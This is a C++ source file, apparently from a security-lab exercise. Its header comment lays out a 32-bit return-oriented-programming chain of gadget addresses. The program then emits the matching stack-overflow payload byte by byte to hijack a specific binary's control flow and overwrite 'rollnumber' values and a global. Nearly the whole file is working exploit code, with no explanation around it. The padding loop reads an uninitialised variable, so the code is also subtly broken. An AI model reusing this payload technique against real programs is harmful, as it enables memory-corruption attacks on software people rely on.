/*************************************************

0x08048983   (ra) to main 

0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00003332   (32 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea07e   (rollnumber2+6 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00004230   (B0 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea07c   (rollnumber2+4 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00003138   (18 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea07a   (rollnumber2+2 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret

0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00003536   (56 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea06e   (rollnumber1+6 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00004230   (B0 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea06c   (rollnumber1+4 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret
0x08065a43   (ra) corresponds to mov word ptr [edx], ax ; mov eax, edx ; ret
0x00003138   (18 on top of stack)
0x080b8376   (ra)corresponds to (pop eax;ret)
0x080ea06a   (rollnumber1+2 on top of stack)
0x0805bf42   (ra) corresponds to pop edx;ret

0x08054bfb   (ra) corresponds to mov dword ptr [edx], eax ; ret glb = 720
0x080eba20   (address of glb)
0x0805bf42   (ra) corresponds to pop edx;ret edx = glb
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 720
0x00000000   (random value on top of stack)
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 360
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 2
0x080eba20   (address of glb)
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
0x00000002   (2 on top stack)
0x080b8376   (ra) corresponds to pop eax;ret # eax= 2
0x080eba20   (address of glb)
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 360
0x00000000   (random value on top of stack)
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 360
0x00000000   (random value on top of stack)
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 120
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 3
0x080eba20   (address of glb)
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
0x00000003   (3 on top stack)
0x080b8376   (ra) corresponds to pop eax;ret # eax= 3
0x080eba20   (address of glb)
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 120
0x00000000   (random value on top of stack)
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 120
0x00000000   (random value on top of stack)
0x0804f44a   (ra) corresponds to mov eax, ebx ; pop ebx ; ret  #eax = 30
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 4
0x080eba20   (address of glb)
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
0x00000004   (4 on top stack)
0x080b8376   (ra) corresponds to pop eax;ret # eax= 4
0x080eba20   (address of glb)
0x080dec61   (ra) corresponds to pop ecx;ret #ecx = &glb
0x080d64bb   (ra) corresponds to push eax ; pop ebx ; or cl, byte ptr [esi] ; adc al, 0x41 ; ret ebx = 30
0x00000000   (random value on top of stack)
0x08063258   (ra) corresponds to  imul dword ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret   eax = 30
0x00000006   (6 on top of stack)
0x080b8376   (ra) corresponds to #pop eax;ret    eax = 6
0x08054bfb   (ra) corresponds to # mov dword ptr [edx], eax ; ret   glb = 5 
0x080eba20   (address of glb on top of stack)
0x0805bf42   (ra) corresponds to # pop edx;ret   // edx = &glb
0x00000005   (5 on top of stack)
0x080b8376   (ra) corresponds to #pop eax ; ret 
0x080eba20   (address of glb)
0x080dec61   (ra) corresponds to  # pop ecx;ret  // ecx = &glb


****************************************/


#include <iostream>

using namespace std;

int main() {
    string s;
    int k;
    for(int i=0;i<k;i++){
        s.push_back('0');
    }
    
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x89);s.push_back('\n');
    s.push_back(0x04);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x32);s.push_back('\n');
    s.push_back(0x33);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x7e);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x30);s.push_back('\n');
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x7c);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x38);s.push_back('\n');
    s.push_back(0x31);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x7a);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x36);s.push_back('\n');
    s.push_back(0x35);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x6e);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x30);s.push_back('\n');
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x6c);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x43);s.push_back('\n');
    s.push_back(0x5a);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x38);s.push_back('\n');
    s.push_back(0x31);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x6a);s.push_back('\n');
    s.push_back(0xa0);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0xfb);s.push_back('\n');
    s.push_back(0x4b);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x42);s.push_back('\n');
    s.push_back(0xbf);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');
    s.push_back(0x01);s.push_back('\n');
    
    for(int i=2;i<5;i++) {
        s.push_back(0x58);s.push_back('\n');
        s.push_back(0x32);s.push_back('\n');
        s.push_back(0x06);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        //41
        s.push_back(0x4a);s.push_back('\n');
        s.push_back(0xf4);s.push_back('\n');
        s.push_back(0x04);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0xfb);s.push_back('\n');
        s.push_back(0x4b);s.push_back('\n');
        s.push_back(0x05);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x20);s.push_back('\n');
        s.push_back(0xba);s.push_back('\n');
        s.push_back(0x0e);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x42);s.push_back('\n');
        s.push_back(0xbf);s.push_back('\n');
        s.push_back(0x05);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back((unsigned char)i);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');
        s.push_back(0x00);s.push_back('\n');
        
        s.push_back(0x76);s.push_back('\n');
        s.push_back(0x83);s.push_back('\n');
        s.push_back(0x0b);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x20);s.push_back('\n');
        s.push_back(0xba);s.push_back('\n');
        s.push_back(0x0e);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x61);s.push_back('\n');
        s.push_back(0xec);s.push_back('\n');
        s.push_back(0x0d);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0xbb);s.push_back('\n');
        s.push_back(0x64);s.push_back('\n');
        s.push_back(0x0d);s.push_back('\n');
        s.push_back(0x08);s.push_back('\n');
        
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        s.push_back(0x01);s.push_back('\n');
        
    }
    
    s.push_back(0x58);s.push_back('\n');
    s.push_back(0x32);s.push_back('\n');
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x06);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0xfb);s.push_back('\n');
    s.push_back(0x4b);s.push_back('\n');
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x05);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    s.push_back(0x00);s.push_back('\n');
    
    s.push_back(0x76);s.push_back('\n');
    s.push_back(0x83);s.push_back('\n');
    s.push_back(0x0b);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x20);s.push_back('\n');
    s.push_back(0xba);s.push_back('\n');
    s.push_back(0x0e);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    s.push_back(0x61);s.push_back('\n');
    s.push_back(0xec);s.push_back('\n');
    s.push_back(0x0d);s.push_back('\n');
    s.push_back(0x08);s.push_back('\n');
    
    cout<<s;
}


